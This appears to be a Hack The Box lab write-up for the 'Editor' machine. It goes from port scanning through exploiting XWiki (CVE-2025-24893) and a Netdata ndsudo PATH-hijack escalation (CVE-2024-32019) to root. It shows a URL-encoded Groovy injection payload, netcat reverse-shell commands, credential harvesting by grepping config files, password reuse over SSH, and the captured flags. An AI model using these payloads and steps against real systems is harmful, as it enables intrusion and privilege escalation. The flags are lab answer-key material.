# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.148.104 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:16 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.50% done; ETC: 13:20 (0:03:54 remaining)
Stats: 0:17:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.87% done; ETC: 13:38 (0:03:43 remaining)
Nmap scan report for 10.129.148.104
Host is up (0.099s latency).
Not shown: 907 closed tcp ports (reset), 90 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1591.10 seconds

```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
nmap -p22,80,8080 -sCV 10.129.148.104 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:50 CEST
Nmap scan report for editor.htb (10.129.148.104)
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

As you can see, there are two HTTP ports open that I can take a look at. First, I looked at the port 80 connection. This takes you to the following page.

![[Pasted image 20250811141349.png]]
But we won't be able to do anything on this page. In the nmap command, you can see that port 8080 is also open. If we go to this web page, you will see the following.

![[Pasted image 20250811141813.png]]

There, I followed the steps to download the .deb file and open it using simplistcode, but you will encounter the following error message. http://editor.htb:8080/xwiki/bin/view/Main/Installation/

![[Pasted image 20250811141944.png]]
So I took another look at my nmap command and saw that it contained a bunch of different URLs. I started searching for a specific URL that might contain more information, and my search led me to the following URL: http://editor.htb:8080/xwiki/bin/save, which redirects you to the login page that can be found at the following URL. http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?srid=M4QBa4rn&xredirect=%2Fxwiki%2Fbin%2Fsave%3Fsrid%3DM4QBa4rn On the login page, you can see that it is running on xwiki Debian version 15.10.8. So we will search the internet for an exploit for this version.

To find the exploit, I searched for the following term: ‘XWiki Debian 15.10.8 exploit github’, which will take you to the following link. https://github.com/gunzf0x/CVE-2025-24893

```
┌──(kali㉿kali)-[~/HTB/Editor/CVE-2025-24893]
└─$ python3 CVE-2024-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.51 9001 -e /bin/bash'
[*] Attacking http://editor.htb:8080
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.51%209001%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                                                                                                                 
[*] Command executed

~Happy Hacking

┌──(kali㉿kali)-[~/HTB/Editor]
└─$ nc -lvnp 9001              
listening on [any] 9001 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.148.104] 52500
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

I searched the connection for usernames and passwords. I found the username “Oliver” and the following password “theEd1t0rTeam99.” You can find this by executing the following.

```
xwiki@editor:/etc/xwiki$ grep -ri "password"
grep -ri "password"
hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>

xwiki@editor:/etc/xwiki$ ls /home
ls /home
oliver
```

You can use this information to log in to the SSH server.

```
┌──(kali㉿kali)-[~/HTB/Editor/CVE-2025-24893]
└─$ ssh oliver@10.129.148.104
oliver@10.129.148.104's password: 
Permission denied, please try again.
oliver@10.129.148.104's password: theEd1t0rTeam99

oliver@editor:~$
```

There you can find the user flag.

User flag: dd0e6034603744dac7c8fa3461b63e5a

```
oliver@editor:~$ cat user.txt 
dd0e6034603744dac7c8fa3461b63e5a
```

Now I have started downloading linpeas on the machine to see if there is any sensitive data, paths, or possible exploits that could be misused. There we can see that there is a localhost with port 19999 (Netdata port) in the hosts file. We will now set this up using port forwarding.

```
┌──(kali㉿kali)-[~/HTB]
└─$ ssh oliver@editor.htb -L 19999:127.0.0.1:19999                              
oliver@editor.htb's password: theEd1t0rTeam99
```

If we now navigate to the webpage, you will see the following.

![[Pasted image 20250812200019.png]]

As you can see in the top right corner, there is an exclamation mark. This means that there is a critical alarm. When we take a closer look, we see that the netdata agent is not up to date. It is currently running version 1.45.2, so we will search for an exploit using the following term: `exploit netdata 1.45.2 github`. If you use this search term, you will see the following link. https://github.com/AliElKhatteb/CVE-2024-32019-POC.git

So I executed what was in the exploit and uploaded it to my ssh connection. Before you convert your exploit.c file to the nvme file, you will need to change your IP address in the script to your own IP address. Then you can upload the nvme file to the ssh connection with Oliver. There you will have to give the file executable rights so that you can execute it, and then you start the listener on your own machine and execute it as follows.

```
Op de ssh connectie

oliver@editor:~$ wget http://10.10.14.144:8000/nvme
--2025-08-12 18:13:03--  http://10.10.14.144:8000/nvme
Connecting to 10.10.14.144:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 758864 (741K) [application/octet-stream]
Saving to: ‘nvme’

nvme                         100%[==============================================>] 741.08K  1.12MB/s    in 0.6s    

2025-08-12 18:13:04 (1.12 MB/s) - ‘nvme’ saved [758864/758864]

oliver@editor:~$ ls
linpeas_linux_amd64  nvme  user.txt
oliver@editor:~$ chmod +x nvme
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

Listener op je eigen machine

┌──(kali㉿kali)-[~/HTB/Editor/CVE-2024-32019-POC]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.222.76] 50664
root@editor:/home/oliver#
```

### What exactly did I do within the ssh connection?

I have assigned executable rights to the nvme file so that we can execute it. By using the `PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list` command, I temporarily place my current directory (`$(pwd)`) at the front of my `PATH` variable. This ensures that programs in my current directory are found first when I execute a command, while still allowing me to access all standard commands in my existing `PATH`. Next, I start the `ndsudo` program, which is located in the Netdata plugin directory (`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`). With the appropriate permissions, this Netdata utility can execute commands that normal users are not allowed to execute, but which are necessary for system monitoring. As an argument, I pass `nvme-list`, which instructs `ndsudo` to display an overview of my NVMe disks and their status.

In short: I temporarily modify my search path, start the Netdata plugin `ndsudo`, and have it execute the command `nvme-list` so that I can obtain a connection to the root user via my listener.

As you can see, we have a connection to the root user and can therefore also obtain the root flag.
Root flag: 112d3f29c2eebf1729083b72f78a56ee

```
root@editor:/root# cat root.txt
cat root.txt
112d3f29c2eebf1729083b72f78a56ee
```

ROOTED

![[Pasted image 20250812202031.png]]